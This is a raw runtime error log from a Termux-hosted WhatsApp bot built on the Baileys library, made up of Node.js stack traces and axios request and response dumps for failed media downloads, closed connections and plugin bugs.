      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/NdoLW6RfSZpDjmAc08xA',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: false,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://cdn.filestackcontent.com/NdoLW6RfSZpDjmAc08xA',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 40,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: HTTPParser {
      '0': null,
      '1': [Function: parserOnHeaders],
      '2': [Function: parserOnHeadersComplete],
      '3': [Function: parserOnBody],
      '4': [Function: parserOnMessageComplete],
      '5': null,
      '6': null,
      _headers: [],
      _url: '',
      socket: [TLSSocket],
      incoming: [IncomingMessage],
      outgoing: [Circular *1],
      maxHeaderPairs: 2000,
      _consumed: false,
      onIncoming: [Function: parserOnIncomingClient],
      joinDuplicateHeaders: undefined,
      [Symbol(resource_symbol)]: [HTTPClientAsyncResource]
    },
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'cdn.filestackcontent.com',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://cdn.filestackcontent.com/NdoLW6RfSZpDjmAc08xA',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'cdn.filestackcontent.com',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 11,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'cdn.filestackcontent.com',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: [HTTPParser],
      _httpMessage: [Circular *1],
      autoSelectFamilyAttemptedAddresses: [Array],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 952536,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 7238486,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 952538,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 429,
    statusText: 'Too Many Requests',
    headers: Object [AxiosHeaders] {
      connection: 'keep-alive',
      'content-length': '50',
      'content-type': 'text/plain; charset=utf-8',
      'access-control-allow-headers': 'Content-Type, X-No-Stream',
      'access-control-allow-methods': 'DELETE, GET, HEAD, POST, PUT',
      'access-control-allow-origin': '*',
      'access-control-max-age': '21600',
      'cache-control': 'private',
      'filestack-trace-id': '1722689029-1ERiSMjXS2',
      'x-content-type-options': 'nosniff',
      via: '1.1 varnish, 1.1 varnish',
      'accept-ranges': 'bytes',
      age: '0',
      date: 'Sat, 03 Aug 2024 12:43:49 GMT',
      'x-served-by': 'cache-iad-kiad7000145-IAD, cache-kul9829-KUL',
      'x-cache': 'MISS, MISS',
      'x-cache-hits': '0, 0',
      'x-timer': 'S1722689029.236190,VS0,VE235',
      vary: 'Fastly-Fs-Security',
      'content-security-policy': "default-src 'self'; font-src 'self'; img-src 'self'; script-src 'self'; style-src 'unsafe-inline';"
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://cdn.filestackcontent.com/NdoLW6RfSZpDjmAc08xA',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /NdoLW6RfSZpDjmAc08xA HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.3\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: cdn.filestackcontent.com\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/NdoLW6RfSZpDjmAc08xA',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: [HTTPParser],
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'cdn.filestackcontent.com',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: false,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://cdn.filestackcontent.com/NdoLW6RfSZpDjmAc08xA',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 40,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[03/08/24 20:28:05] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:547:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.3',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.3\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 2433554,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 9894506,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 2433556,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Sat, 03 Aug 2024 13:30:48 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.3\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[03/08/24 21:31:11] - Error: Connection Closed
    at sendRawMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:59:19)
    at sendNode (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:78:16)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:142:15)
    at getUSyncDevices (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:166:30)
    at /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:358:53
    at Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:32)
    at relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:30)
    at Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:654:23)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382) {
  data: null,
  isBoom: true,
  isServer: false,
  output: {
    statusCode: 428,
    payload: {
      statusCode: 428,
      error: 'Precondition Required',
      message: 'Connection Closed'
    },
    headers: {}
  }
}
[04/08/24 06:37:56] - TypeError: Cannot read properties of undefined (reading 'sendMessage')
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/owner/tierbot.js:20:8)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[04/08/24 06:40:03] - ReferenceError: mecha is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/owner/tierbot.js:20:3)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[04/08/24 22:43:42] - Error: Connection Closed
    at sendRawMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:59:19)
    at sendNode (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:78:16)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:142:15)
    at getUSyncDevices (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:166:30)
    at /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:358:53
    at Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:32)
    at Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:30)
    at Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:13) {
  data: null,
  isBoom: true,
  isServer: false,
  output: {
    statusCode: 428,
    payload: {
      statusCode: 428,
      error: 'Precondition Required',
      message: 'Connection Closed'
    },
    headers: {}
  }
}
[05/08/24 18:52:30] - ReferenceError: command is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/owner/stickerwarn.js:6:1)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[07/08/24 05:55:50] - TypeError: Cannot read properties of undefined (reading 'match')
    at extractUrlFromText (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:39:66)
    at generateLinkPreviewIfRequired (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:42:48)
    at generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:247:71)
    at generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:102)
    at Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:69)
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/convert/tourl.js:11:13)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[07/08/24 05:57:53] - TypeError: func.uploadImage is not a function
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/convert/tourl.js:21:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[08/08/24 21:13:32] - AxiosError: aborted
    at AxiosError.from (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:873:14)
    at BrotliDecompress.handleStreamError (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:3115:29)
    at BrotliDecompress.emit (node:events:532:35)
    at emitErrorNT (node:internal/streams/destroy:170:8)
    at emitErrorCloseNT (node:internal/streams/destroy:129:3)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
    at Axios.request (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:4262:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async /data/data/com.termux/files/home/.BOTTT/plugins/ai/openai.js:6:18 {
  code: 'ECONNRESET',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': 'application/json',
      'User-Agent': 'axios/1.7.3',
      'Content-Length': '20643',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    method: 'post',
    url: 'https://api.yanzbotz.my.id/api/ai/gpt4',
